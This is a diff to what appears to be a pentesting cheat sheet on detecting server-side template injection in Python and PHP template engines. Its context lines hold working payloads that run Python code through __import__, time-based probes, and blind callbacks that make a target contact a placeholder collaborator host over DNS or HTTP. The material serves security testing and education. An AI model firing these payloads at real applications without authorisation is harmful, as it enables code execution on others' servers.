@@ -26,7 +26,7 @@
 - `${repeat.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}` - delays can be observed
 - `${str(repeat.__class__.__init__.__globals__['__builtins__']['__import__']('socket').gethostbyname('<your-webhooks-/-collaborator>'))}` - DNS based if web traffic is blocked
 - `${str(repeat.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').request.urlopen('http://<your-webhooks-/-collaborator>'))}` - HTTP request trigger works only if web traffic is allowed
-
+---
 ### Cheetah Detection
 
 #### Universal Non-Error-Based Polyglots
@@ -40,7 +40,7 @@
 - `$__import__('time').sleep(5)` - Time based
 - `$str($__import__('socket').gethostbyname('cheetah-blind.<your-webhooks-/-collaborator>'))` - DNS based if web traffic is blocked
 - `$str($__import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>'))` - HTTP request trigger works only if web traffic is allowed
-
+---
 ### Django Detection
 
 #### Universal Non-Error-Based Polyglots
@@ -48,7 +48,7 @@
 
 #### Specific Non-Error-Based Polyglots
 - `{{1in[1]}}` - Error
-
+---
 ### Jinja2 & Jinja2 (Sandbox) Detection
 
 #### Universal Non-Error-Based Polyglots
@@ -67,7 +67,7 @@
 #### Sandbox Detection Tip
 - `{{ [].__class__.__base__ }}` - `<class 'object'>` indicates Jinja2
 - A 500 server error when accessing special attributes may indicate Jinja2 sandbox restrictions
-
+---
 ### Mako Detection
 
 #### Universal Non-Error-Based Polyglots
@@ -80,7 +80,7 @@
 - `${__import__('time').sleep(5)}` - Time based
 - `${__import__('socket').gethostbyname('mako-blind.<your-webhooks-/-collaborator>')}` - DNS
 - `${__import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>')}` - Web traffic
-
+---
 ### Pystache Detection
 
 #### Universal Error-Based Polyglots
@@ -96,7 +96,7 @@
 
 #### Specific Non-Error-Based Polyglots
 - `//*<!--{##<%=1%>{{!--{{1}}--}}-->*/#}` - `//*<!--{##<%=1%>--}}-->*/#}`
-
+---
 ### SimpleTemplateEngine Detection
 
 #### Universal Error-Based Polyglots
@@ -109,7 +109,7 @@
 - `{{ __import__('time').sleep(5) }}` - Time based
 - `{{ __import__('socket').gethostbyname('simple-template.<your-webhooks-/-collaborator>') }}` - DNS
 - `{{ __import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>') }}` - Web traffic
-
+---
 ### Tornado Detection
 
 #### Specific Error-Based Polyglots
@@ -124,7 +124,7 @@
 - `{{ __import__('socket').gethostbyname('tornado-engine.<your-webhooks-/-collaborator>') }}` - DNS
 - `{{ __import__('urllib.request', fromlist=['request']).urlopen('http://<your-webhooks-/-collaborator>') }}` - Web traffic
 
-
+---
 ## PHP Template Engines
 
 ### Blade Detection
@@ -145,5 +145,8 @@
 > Here, get_headers is an native php utility.
 
 #### To run the lab
-> composer require illuminate/view illuminate/events
-> php -s <Socket>
+```
+composer require illuminate/view illuminate/events 
+php -s 127.0.0.1:5001
+```
+---
